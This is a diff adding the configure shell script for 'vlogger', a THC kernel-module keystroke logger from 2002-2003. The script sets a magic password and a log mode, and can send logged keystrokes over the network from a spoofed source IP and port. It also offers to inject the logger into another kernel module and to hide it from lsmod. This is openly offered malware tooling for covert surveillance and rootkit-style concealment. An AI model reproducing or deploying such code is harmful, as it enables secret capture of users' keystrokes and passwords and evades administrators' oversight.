@@ -1,0 +1,226 @@
+#!/bin/sh
+#
+# Copyright (C) 2002-2003 RD <rd@thc.org>
+#
+# This script handles all aspects of configuring the vlogger.
+ 
+# get user input data
+
+get_data() {
+	local myvar="$1"
+	shift
+	# print out the message
+	echo -en "$@"
+	read data
+	if [ ! -z "$data" ] ; then
+		eval $myvar="$data"
+	fi
+	echo
+}
+
+showinfo() {
+	clear
+	head -10 README
+	echo
+	cat NOTICE
+	echo
+}
+
+get_pass() {
+	MAGIC_PASS=""
+	while [ -z "$MAGIC_PASS" ] ; do
+		get_data MAGIC_PASS "Please choose magic password for logmode switching (echoed): "
+	done
+}
+
+get_tz() {
+	if [ -z "$TIMEZONE" ]; then
+		TIMEZONE=`date +"%z" | awk '{ print $1/100; }'`
+	fi
+	get_data TIMEZONE "Please choose timezone (offset to GMT, from -12 to 13) [$TIMEZONE]: "
+}
+
+get_method() {
+	# Log method
+	# 0: local file, 1: network
+	if [ -z "$LOG_METHOD" ]; then
+		LOG_METHOD=0
+	fi
+	get_data LOG_METHOD "Please choose log method (0: local file, 1: network) [$LOG_METHOD]: "
+}
+
+get_mode() {
+	# Default log mode
+	# 0: nolog, 1: dumb, 2: smart
+	if [ -z "$LOG_MODE" ]; then
+		LOG_MODE=1
+	fi
+	get_data LOG_MODE "Please choose default log mode (0: nolog, 1: dumb, 2: smart) [$LOG_MODE]: "
+}
+
+get_logdir() {
+	if [ ! -z "$LOG_DIR" ]; then
+		get_data LOG_DIR "In which directory do you want to save log data [$LOG_DIR]: "
+	else
+		while [ -z "$LOG_DIR" ] ; do
+			get_data LOG_DIR "In which directory do you want to save log data: "
+		done
+	fi
+}
+
+get_netconf() {
+	get_data SRC_IP "Fake source IP address (enter to use IP of output device) [$SRC_IP]: "
+
+	if [ -z "$SRC_PORT" ]; then 
+		SRC_PORT="53"
+	fi
+	get_data SRC_PORT "Source port [$SRC_PORT]: "
+
+	if [ ! -z "$DEST_IP" ]; then
+		get_data DEST_IP "vlogger server's IP address [$DEST_IP]: "
+	else
+		while [ -z "$DEST_IP" ] ; do
+			get_data DEST_IP "vlogger server's IP address [$DEST_IP]: "
+		done
+	fi
+
+	if [ -z "$DEST_PORT" ]; then
+		DEST_PORT="1337"
+	fi
+	get_data DEST_PORT "Destination port [$DEST_PORT]: "
+}
+
+make_config() {
+cat >tool/config.h <<__EOF__
+#if $LOG_METHOD
+extern char *src_ip;
+extern char *dest_ip;
+extern int src_port;
+extern int dst_port;
+#else
+extern char *logdir;
+#endif
+extern int log_method;
+extern int log_mode;
+extern char *magic_pass;
+extern int timezone;
+inline void __init_parm(void) {
+#if $LOG_METHOD
+	src_ip = (char *)&"$SRC_IP";
+	dest_ip = (char *)&"$DEST_IP";
+	src_port = $SRC_PORT;
+	dst_port = $DEST_PORT;
+#else
+	logdir = (char *)&"$LOG_DIR";
+#endif
+	log_method = $LOG_METHOD;
+	log_mode = $LOG_MODE;
+	magic_pass = (char *)&"$MAGIC_PASS";
+	timezone = $TIMEZONE;
+}
+__EOF__
+}
+
+inject_parm() {
+	echo "Current loaded modules: "
+	MODLIST=`cut -f1 -d' '</proc/modules`
+	i=1
+	for m in $MODLIST; do
+		MODULES[$i]=$m
+		echo $i. $m
+		i=$(($i+1))
+	done
+
+	echo -e "$i. Others\n"
+	idx=0
+	while [ ! $(echo $idx | grep '^[0-9]*$') ] || [ "$idx" -gt $i ] || [ "$idx" -lt 1 ]; do
+		echo -n "Choose destination module: "
+		read idx
+	done
+	
+	if [ "$idx" -ne $i ]; then
+		MODPATH=`find /lib/modules/\`uname -r\`/kernel -name "${MODULES[$idx]}.$MOD_EXT" -print 2>/dev/null`
+	fi
+	get_data MODPATH "Path to destination module [$MODPATH]: "
+
+	while [ ! -f $MODPATH ]; do
+		echo -e "No such file $MODPATH\n"
+		get_data MODPATH "Path to destination module: "
+	done
+}
+
+PATH=/usr/sbin:/sbin:/usr/bin:/bin:/usr/local/sbin:/usr/local/bin
+export PATH
+umask 022
+
+showinfo
+
+# start configuration
+echo -n "Continue y/N? [N]: "
+read answer
+[ "${answer#[yY]}" = "$answer" ] && exit 1
+echo
+
+if [ -f vlogctrl ]; then
+	. vlogctrl &>/dev/null
+fi
+
+# Config vlogger options
+MOD_EXT=ko
+export MOD_EXT
+
+get_pass
+get_tz
+get_method
+get_mode
+
+if [ $LOG_METHOD -eq 0 ] ; then
+
+	get_logdir
+	if [ ! -d "$LOG_DIR" ]; then
+		mkdir -p $LOG_DIR || exit $?
+	fi
+else
+	get_netconf
+fi
+
+if [ -z "$HIDE" ]; then
+	HIDE=0
+fi
+
+echo -n "Inject vlogger module into another module y/N? [N]: "
+read answer
+if [ "${answer#[yY]}" != "$answer" ]; then
+	inject_parm
+	make_config
+	tool/modinject $MODPATH vlogger.$MOD_EXT || exit $?
+else
+	echo -n "Hide vlogger module from lsmod after loaded y/N? [N]: "
+	read answer
+
+	if [ "${answer#[yY]}" != "$answer" ]; then
+		HIDE=1
+		make -C tool modclean || exit $?
+	fi
+fi
+
+
+# Update vlogctrl 
+# echo -e "Updating vlogctrl ..."
+sed -e "s#MAGIC_PASS=\(.*\)#MAGIC_PASS=$MAGIC_PASS#; \
+	s#LOG_MODE=\(.*\)#LOG_MODE=$LOG_MODE#; \
+	s#LOG_METHOD=\(.*\)#LOG_METHOD=$LOG_METHOD#; \
+	s#TIMEZONE=\(.*\)#TIMEZONE=$TIMEZONE#; \
+	s#LOG_DIR=\(.*\)#LOG_DIR=$LOG_DIR#; \
+	s#HIDE=\(.*\)#HIDE=$HIDE#; \
+	s#SRC_IP=\(.*\)#SRC_IP=$SRC_IP#; \
+	s#SRC_PORT=\(.*\)#SRC_PORT=$SRC_PORT#; \
+	s#DEST_IP=\(.*\)#DEST_IP=$DEST_IP#; \
+	s#DEST_PORT=\(.*\)#DEST_PORT=$DEST_PORT#; \
+	s#MOD_EXT=\(.*\)#MOD_EXT=$MOD_EXT#;" \
+	> ./vlogctrl < ./vlogctrl.gen || exit $?
+
+chmod +x ./vlogctrl
+
+echo Done!
+
